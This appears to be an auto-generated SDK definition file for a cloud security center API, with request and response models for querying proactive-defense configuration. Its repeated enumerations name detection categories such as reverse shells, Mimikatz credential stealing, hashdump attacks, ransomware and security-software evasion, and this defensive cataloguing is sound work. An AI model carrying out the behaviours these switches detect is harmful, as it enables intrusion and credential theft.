*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE\\_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch'),
}

model DescribeCommonOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
    type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE\\_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch'),
  }(name='OverallConfig', description='The information about the feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigResponseBody(name='body'),
}

async function describeCommonOverallConfigWithOptions(request: DescribeCommonOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonOverallConfig(request: DescribeCommonOverallConfigRequest): DescribeCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigWithOptions(request, runtime);
}

model DescribeCommonOverallConfigListRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='119.136.XX.XX'),
  typeList?: [ string ](name='TypeList', description='The type of the feature in proactive defense. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)'),
}

model DescribeCommonOverallConfigListResponseBody = {
  overallList?: [ 
    {
      config?: string(name='Config', description='The status of the feature. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='184'),
      type?: string(name='Type', description='The type of the feature in proactive defense. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)', example='kdump_switch'),
    }
  ](name='OverallList', description='An array that consists of the configurations of features.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeCommonOverallConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigListResponseBody(name='body'),
}

async function describeCommonOverallConfigListWithOptions(request: DescribeCommonOverallConfigListRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonOverallConfigList(request: DescribeCommonOverallConfigListRequest): DescribeCommonOverallConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigListWithOptions(request, runtime);
}

model DescribeCommonTargetConfigRequest {
  type?: string(name='Type', example='kdump_switch'),
}

model DescribeCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  targetList?: [ 
    {
      flag?: string(name='Flag', example='add'),
      target?: string(name='Target', example='c23551de6149343e8a54e69fbefe6****'),
      targetType?: string(name='TargetType', example='image_repo'),
    }
  ](name='TargetList'),
}

model DescribeCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetConfigResponseBody(name='body'),
}

async function describeCommonTargetConfigWithOptions(request: DescribeCommonTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonTargetConfig(request: DescribeCommonTargetConfigRequest): DescribeCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetConfigWithOptions(request, runtime);
}

model DescribeCommonTargetResultListRequest {
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model DescribeCommonTargetResultListResponseBody = {
  requestId?: string(name='RequestId'),
  targetConfig?: {
    flag?: string(name='Flag'),
    targetDefault?: string(name='TargetDefault'),
    targetList?: [ string ](name='TargetList'),
    targetType?: string(name='TargetType'),
    totalCount?: string(name='TotalCount'),
    type?: string(name='Type'),
  }(name='TargetConfig'),
}

model DescribeCommonTargetResultListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetResultListResponseBody(name='body'),
}

async function describeCommonTargetResultListWithOptions(request: DescribeCommonTargetResultListRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetResultListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetResultList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonTargetResultList(request: DescribeCommonTargetResultListRequest): DescribeCommonTargetResultListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetResultListWithOptions(request, runtime);
}

model DescribeConcernNecessityRequest {
  lang?: string(name='Lang'),
}

model DescribeConcernNecessityResponseBody = {
  concernNecessity?: [ string ](name='ConcernNecessity'),
  requestId?: string(name='RequestId'),
}

model DescribeConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeConcernNecessityResponseBody(name='body'),
}

async function describeConcernNecessityWithOptions(request: DescribeConcernNecessityRequest, runtime: Util.RuntimeOptions): DescribeConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeConcernNecessity(request: DescribeConcernNecessityRequest): DescribeConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeConcernNecessityWithOptions(request, runtime);
}

model DescribeContainerCriteriaRequest {
  groupField?: string(name='GroupField'),
  value?: string(name='Value'),
}

model DescribeContainerCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model DescribeContainerCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerCriteriaResponseBody(name='body'),
}

async function describeContainerCriteriaWithOptions(request: DescribeContainerCriteriaRequest, runtime: Util.RuntimeOptions): DescribeContainerCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerCriteria(request: DescribeContainerCriteriaRequest): DescribeContainerCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerCriteriaWithOptions(request, runtime);
}

model DescribeContainerInstancesRequest {
  criteria?: string(name='Criteria', example='[{"name":"flag","value":"0|8","logicalExp":"AND"},{"name":"ecsType","value":"!8","logicalExp":"AND"}][{"name":"clusterType","value":"NotManagedKubernetes","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', example='1'),
  logicalExp?: string(name='LogicalExp', example='AND'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeContainerInstancesResponseBody = {
  containerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='1'),
      alarmStatus?: string(name='AlarmStatus', example='YES'),
      appName?: string(name='AppName', example='alibaba-log-controller'),
      clusterId?: string(name='ClusterId', example='cfb41a869c71e4678a97021582dd8a****'),
      clusterName?: string(name='ClusterName', example='test'),
      containerId?: string(name='ContainerId', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d****'),
      createTimestamp?: long(name='CreateTimestamp', example='1670368337000'),
      hcCount?: int32(name='HcCount', example='1'),
      hcStatus?: string(name='HcStatus', example='YES'),
      hostIp?: string(name='HostIp', example='172.24.XX.XX'),
      image?: string(name='Image', example='docker.io/library/nginx:latest'),
      imageDigest?: string(name='ImageDigest', example='5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageId?: string(name='ImageId', example='registry-vpc.cn-beijing.aliyuncs.com/acs/log-controller@sha256:5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageRepoName?: string(name='ImageRepoName', example='log-controller'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', example='acs'),
      imageRepoTag?: string(name='ImageRepoTag', example='0.3.1.0-dfa2010-aliyun'),
      imageUuid?: string(name='ImageUuid', example='5f23dfbceec289a49ac94e035e2****'),
      instanceId?: string(name='InstanceId', example='i-2zegzjyotydfkz9****'),
